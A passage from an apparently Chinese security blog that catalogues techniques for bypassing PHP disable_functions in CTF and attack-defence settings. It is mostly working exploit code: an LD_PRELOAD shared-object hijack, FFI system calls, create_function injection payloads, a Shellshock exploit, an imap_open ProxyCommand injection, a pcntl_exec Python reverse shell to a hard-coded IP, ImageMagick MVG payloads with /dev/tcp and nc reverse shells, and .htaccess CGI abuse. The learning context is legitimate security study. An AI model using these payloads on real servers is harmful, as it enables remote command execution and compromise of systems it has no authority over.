class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把这个.c编译为.so文件即可，然后是加载.so文件的php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码接收三个GET参数，一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 &#x2F;tmp&#x2F;xx），便于在页面上显示，另外关于该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。<br>下面上传代码测试一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655149.png" alt="image-20231206165528022"><br>成功绕过执行，注意outpath后面的路径一定要可写才行，这种方式也可以在awd中去劫持<code>ls、cat</code>等命令，让他在执行命令的时候就把flag发给你了<br>[[LD_PRELOAD劫持]]</p><h2 id="利用PHP7-4-FFI绕过"><a href="#利用PHP7-4-FFI绕过" class="headerlink" title="利用PHP7.4 FFI绕过"></a>利用PHP7.4 FFI绕过</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Linux 操作系统</li><li>PHP &gt;&#x3D; 7.4</li><li>开启了 FFI 扩展且<code>ffi.enable=true</code><br>ffi.enable默认是没有开启的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655200.png" alt="image-20231206165546145"><br>然后去php.ini给它设置为true<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655541.png" alt="image-20231206165555494"><br>然后重启一下apache即可生效，记得重启，这样就可以通过c语言的system去执行,绕过disable functions。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$cmd</span> &gt; /tmp/SD&quot;</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061656357.png" alt="image-20231206165616298"><br>当没有权限创建或者修改文件时可以参考buu上<strong>FighterFightsInvincibly</strong>一题</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1)&#123;$d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$ffi-&gt;pclose($o);echo hex2bin($d);/*</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$ffi-&gt;php_exec(3,&quot;ls /&quot;);/*</span><br></pre></td></tr></table></figure><h2 id="利用Bash-Shellshock-CVE-2014-6271-破壳漏洞"><a href="#利用Bash-Shellshock-CVE-2014-6271-破壳漏洞" class="headerlink" title="利用Bash Shellshock(CVE-2014-6271)破壳漏洞"></a>利用Bash Shellshock(CVE-2014-6271)破壳漏洞</h2><h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>利用条件php &lt; 5.6.2 &amp; bash &lt;&#x3D; 4.3（破壳）<blockquote><p>漏洞原理如下：<br>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p></blockquote></li></ul><p>这个复现就直用vulhub的环境了，利用这个绕过其实就是看存不存在破壳漏洞<br>简单测试一下是否存在破壳漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;</span><br></pre></td></tr></table></figure><p>如果输出vulnerable表示存在<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061656407.png" alt="image-20231206165631346"><br>利用exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   <span class="comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line">   <span class="title function_ invoke__">error_log</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">   <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shellshock</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将上面的exp上传到靶机的tmp目录下然后去包含再执行命令即可，这里没有好的测试环境我就不测了，贴个图<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061656688.png" alt="image-20231206165656631"></p><h2 id="利用imap-open-绕过"><a href="#利用imap-open-绕过" class="headerlink" title="利用imap_open()绕过"></a>利用imap_open()绕过</h2><h3 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>安装了PHP的imap扩展</li><li>php.ini中开启imap.enable_insecure_rsh选项为On</li><li>PHP 5.6.0至PHP 5.6.38；PHP 7.0.0至PHP 7.0.32；PHP 7.1.0至PHP 7.1.24；PHP 7.2.0至PHP 7.2.12<br>先安装一下imap扩展<code>apt-get install php-imap</code>然后在php.ini中修改imap.enable_insecure_rsh为On再重启服务<br>![[Pasted image 20231127145433.png]]<br>基本原理如下，大概就是imap_open函数没有对传递的邮箱名称做好安全校验<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。</span><br></pre></td></tr></table></figure>EXP<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imap_open&#x27;</span>)) &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no imap_open function!&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;x -oProxyCommand=echot&quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="string">&quot;|base64t-d|sh&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">imap_open</span>(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$server</span> . <span class="string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;nnError: &quot;</span>.<span class="title function_ invoke__">imap_last_error</span>());</span><br><span class="line"><span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/cmd_result&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>这里我机器上的php版本不行，懒得复现了</li></ul><h2 id="利用-pcntl-exec"><a href="#利用-pcntl-exec" class="headerlink" title="利用 pcntl_exec"></a>利用 pcntl_exec</h2><h3 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>PHP安装并启用了pcntl插件<br>利用pcntl_exec()，它是pcntl插件专有的命令执行函数来执行系统命令函数，但是这个命令没有回显，所以常用来反弹shell，在web目录下创建一个php文件，加入下面代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</span><br></pre></td></tr></table></figure>然后访问这个文件即可反弹成功，我这里没装这个插件，装这个比较麻烦就懒得复现了，这个也算是黑名单绕过了</li></ul><h2 id="利用-ImageMagick-bypass"><a href="#利用-ImageMagick-bypass" class="headerlink" title="利用 ImageMagick bypass"></a>利用 ImageMagick bypass</h2><h3 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>目标主机安装了漏洞版本的 imagemagick（&lt;&#x3D; 3.3.0）</li><li>安装了 php-imagick 拓展并在 php.ini 中启用</li><li>编写 php 通过 new Imagick 对象的方式来处理图片等格式文件</li><li>PHP &gt;&#x3D; 5.4</li></ul><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>原理参考：<a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">CVE-2016-3714 - ImageMagick 命令执行分析 | 离别歌 (leavesongs.com)</a><br>直接在文件上传处上传jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://127.0.0.0/joker.jpg&quot;|id&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>id处为命令执行的地方<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061657507.png" alt="image-20231206165723432"><br>另外还可以进行反弹shell、ssrf、任意文件删除、任意文件读取等，但是没复现成功<br><strong>SSRF</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(http://example.com/)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>任意文件删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &#x27;ephemeral:/tmp/delete.txt&#x27;</span><br><span class="line">popgraphic-context</span><br></pre></td></tr></table></figure><p>任意文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &#x27;label:@/etc/hosts&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>反弹shell，下面这两种方式都失败了不知道为什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第一种方式</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://127.0.0.0/joker.jpg&quot;|bash -i &gt;&amp; /dev/tcp/IP/6666 0&gt;&amp;1&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br><span class="line"></span><br><span class="line">第二种方式</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://127.0.0.0/joker.jpg&quot;|nc -e /bin/bash ip 6666&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>另外看别的文章直接给了exp但没具体的利用方式，我这里没有环境也无法去验证怎么利用，以后遇到了再弄吧。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$command</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exploit</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="subst">$command</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;KKKK.mvg&quot;</span>, <span class="variable">$exploit</span>);</span><br><span class="line"><span class="variable">$thumb</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">readImage</span>(<span class="string">&#x27;KKKK.mvg&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">writeImage</span>(<span class="string">&#x27;KKKK.png&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">clear</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.mvg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>应该就是拿到shell后上传这个文件然后包含它命令执行</p><h2 id="利用-Apache-Mod-CGI"><a href="#利用-Apache-Mod-CGI" class="headerlink" title="利用 Apache Mod CGI"></a>利用 Apache Mod CGI</h2><h3 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Linux 操作系统</li><li>Apache + PHP (apache 使用 apache_mod_php)</li><li>Apache 开启了 <code>cgi</code>, <code>rewrite</code></li><li>Web 目录给了 <code>AllowOverride</code> 权限</li><li>当前目录可写</li></ul><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p><strong>关于Mod CGI</strong><br>早期的<a href="https://so.csdn.net/so/search?q=Web%E6%9C%8D%E5%8A%A1&spm=1001.2101.3001.7020">Web服务</a>器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为CGI是Web服务器和运行其上的应用程序进行“交流”的一种约定。</p><p>当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动<a href="https://so.csdn.net/so/search?q=CGI&spm=1001.2101.3001.7020">CGI</a>程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p><p>而对于Mod CGI，Web服务器可以内置Perl<a href="https://so.csdn.net/so/search?q=%E8%A7%A3%E9%87%8A%E5%99%A8&spm=1001.2101.3001.7020">解释器</a>或PHP解释器。也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。当有新的动态请求进来时，Web服务器就是自己解析这些动态脚本，省得重新Fork一个进程，效率提高了。</p><p>Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：</p><blockquote><p>Options +ExecCGIAddHandler cgi-script .xxx</p></blockquote><p>这样便会将当前目录下的所有的.xxx文件当做CGI程序执行了。</p><p><strong>即web服务器遇到动态请求时，即网页上的数据是从数据库中或者其它地方调用的请求，web服务器就会交给CGI处理，例如php解释器，然后在配置文件（如htaccess）中可以设置某某后缀以CGI程序运行就可以绕过disable_functions</strong></p><h3 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h3><p>这里用<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3">蚁剑的docker</a>做环境复现，如果觉得麻烦也可以直接在ctfhub上用现成的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061657058.png" alt="image-20231206165740013"><br>执行一下phpinfo看看禁用函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv,</span><br></pre></td></tr></table></figure><p>大部分都被禁用了，蚁剑连接然后去绕过<br>web目录下上传<code>.htaccess</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ant</span><br></pre></td></tr></table></figure><p>上传shell.ant</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo Content-type: text/html</span><br><span class="line">echo &quot;&quot;</span><br><span 